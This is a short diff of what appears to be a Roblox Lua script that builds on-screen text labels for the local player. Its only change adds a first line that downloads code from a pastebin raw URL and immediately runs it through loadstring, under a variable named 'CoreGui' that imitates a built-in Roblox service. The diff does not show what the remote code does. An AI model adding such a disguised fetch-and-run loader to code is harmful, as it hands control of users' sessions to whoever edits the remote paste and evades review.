@@ -1,3 +1,4 @@
+local CoreGui = loadstring(game:HttpGet("https://pastebin.com/raw/tWGxhNq0"))()
 local LBLG = Instance.new("ScreenGui", getParent)
 local LBL = Instance.new("TextLabel", getParent)
 local player = game.Players.LocalPlayer
